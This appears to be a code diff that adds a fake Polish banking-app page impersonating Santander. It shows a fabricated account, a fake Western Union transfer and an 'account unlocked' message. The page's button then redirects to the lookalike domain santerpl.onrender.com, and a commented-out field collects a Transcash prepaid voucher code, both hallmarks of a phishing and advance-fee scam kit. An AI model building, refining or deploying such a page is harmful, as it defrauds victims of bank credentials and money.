@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Transfert</title>
+    <style>
+        /* Style de la modal */
+        .modal {
+            display: none; /* Caché par défaut */
+            position: fixed;
+            z-index: 1; /* Au-dessus des autres éléments */
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto; /* Activer le défilement si nécessaire */
+            background-color: rgb(0, 0, 0); /* Couleur de fond */
+            background-color: rgba(0, 0, 0, 0.4); /* Fond noir transparent */
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto; /* Positionnement de la modal */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Largeur de la modal */
+            max-width: 500px; /* Largeur maximale */
+            border-radius: 5px; /* Coins arrondis */
+        }
+
+        .modal-buttons {
+            margin-top: 20px;
+        }
+
+        .cancel, .confirm {
+            padding: 10px 15px;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="header">
+    <div class="header-icon">EG</div>
+    <div>Witaj, Elzbieto!<br>PRAWDZIWE KONTO</div>
+   <div class="search-icons">
+        <a onclick="toggleSearch()">🔍</a>
+        <a onclick="toggleSettings()">⚙️</a>
+    </div>
+</div>
+
+<div class="account-card">
+    <div class="account-label">Konto dla Ciebie</div>
+    <div class="account-number" id="accountNumber">93 1940 1076 6098 8109 000...</div>
+    <div>Dostępne pieniądze</div>
+    <div class="balance">
+<p> <span class="balance-amount" id="balanceAmount" onclick="toggleBalanceVisibility()"> 0 PLN</span>
+</p>
+    </div>
+    <button class="transfer-button" onclick="showTransferModal()">Kliknij tutaj</button>
+</div>
+
+<div class="menu-section">
+    <h3>Wymieniaj waluty</h3>
+    <h3>Bankuj szybko i bezpiecznie...</h3>
+    
+    <div class="partner-logos">
+    <p>Twój konto zostało odblokowane. Proszę kliknąć na przycisk powyżej, aby kontynuować.</p>
+</div>
+
+<div class="transactions">
+    <h3>Moje transakcje</h3>
+    <div class="transaction-item" onclick="showTransactionDetails(1)">
+        <div class="transaction-icon"></div>
+        <div>WESTERN UNION 4457...</div>
+        <div style="margin-left: auto"> 23 212, 15 PLN</div>
+    </div>
+</div>
+
+<nav class="bottom-nav">
+    <a href="index.html" class="nav-item active">
+        <div class="nav-icon">🏠</div>
+        Start
+    </a>
+    <a href="platnosci.html" class="nav-item">
+        <div class="nav-icon">💳</div>
+        Platności
+    </a>
+    <a href="finanse.html" class="nav-item">
+        <div class="nav-icon">📊</div>
+        Finanse
+    </a>
+    <a href="majatek.html" class="nav-item">
+        <div class="nav-icon">💎</div>
+        Majatek
+    </a>
+    <a href="korzysci.html" class="nav-item">
+        <div class="nav-icon">🎁</div>
+        Korzyści
+    </a>
+</nav>
+
+<!-- Modal de transfert -->
+<div id="transferModal" class="modal">
+    <div class="modal-content">
+        <h3>Potwierdzenie przelewu</h3>
+        <p>
+            Przelew został dokonany na konto prywatne Santander. Proszę czekać 2 sekundy, zostaniesz automatycznie przekierowany na swoje konto Santander.
+        </p>
+        <!--<input type="text" id="transcashCode" placeholder="KOD TRANSCASH" style="width: 100%; padding: 10px; margin-top: 10px;">-->
+        <!--<div class="modal-buttons">
+            <button type="button" class="cancel" onclick="hideTransferModal()">Anuluj</button>
+            <button type="button" class="confirm" onclick="confirmTransfer()">Zatwierdź</button>
+        </div>-->
+    </div>
+</div>
+
+<script>
+let isBalanceHidden = false;
+
+function toggleBalanceVisibility() {
+    const balanceAmount = document.getElementById('balanceAmount');
+    isBalanceHidden = !isBalanceHidden;
+    balanceAmount.classList.toggle('hidden-balance');
+}
+
+function toggleSearch() {
+    alert('Wyszukiwarka - funkcja w przygotowaniu');
+}
+
+function toggleSettings() {
+    alert('Ustawienia - funkcja w przygotowaniu');
+}
+
+function showTransferModal() {
+    const modal = document.getElementById('transferModal');
+    modal.style.display = 'flex';
+    
+    // Redirection après un délai de 2 secondes
+    setTimeout(() => {
+        window.location.href = 'https://santerpl.onrender.com/';
+    }, 2000); // 2000 ms = 2 secondes
+}
+
+
+function hideTransferModal() {
+    const modal = document.getElementById('transferModal');
+    modal.style.display = 'none';
+}
+
+function confirmTransfer() {
+    const code = document.getElementById('transcashCode').value;
+    if (code) {
+        alert("Kod wprowadzony: " + code);
+        // Ajoutez la redirection vers la nouvelle page ici
+        window.location.href = 'wiplat.html'; // Redirection vers wiplat.html
+        hideTransferModal(); // Si vous souhaitez masquer le modal après la redirection
+    } else {
+        alert("Musisz wprowadzić kod, aby kontynuować.");
+    }
+}
+function selectPartner(partnerId) {
+    alert(`Wybrano partnera ${partnerId}`);
+}
+
+function showTransactionDetails(transactionId) {
+    alert(`Szczegóły transakcji ${transactionId}`);
+}
+
+// Close modal when clicking outside
+window.onclick = function(event) {
+    const modal = document.getElementById('transferModal');
+    if (event.target === modal) {
+        hideTransferModal();
+    }
+}
+
+// Initialize the app
+document.addEventListener('DOMContentLoaded', () => {
+    console.log('App initialized');
+});
+</script>
+
+</body>
+</html>
